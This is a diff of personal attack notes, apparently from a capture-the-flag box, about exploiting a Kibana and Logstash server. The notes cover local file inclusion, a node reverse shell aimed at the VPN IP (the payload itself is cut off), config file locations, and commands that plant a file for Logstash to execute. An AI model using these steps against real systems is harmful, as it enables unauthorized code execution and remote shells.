@@ -1,3 +1,6 @@
+#lfi first step to kibana
+https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
+
 #rev shell: the ip is the vpn ip and the port is w.e
 https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
 (function(){
@@ -66,3 +69,14 @@ filter {
 
 #starts kibana
 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
+
+#notes:
+yml       : /etc/kibana && /etc/logstash
+logstash_*: /opt/kibana/
+*.conf    : /etc/logstash/conf.d
+logs      : /var/log/logstash
+
+cp input.conf a.conf; rm input.conf; mv a.conf input.conf
+cp /tmp/.template /opt/kibana/logstash_kun; cat /opt/kibana/logstash_kun; ls /opt/kibana
+
+how to make the file run? i think it detects changes...
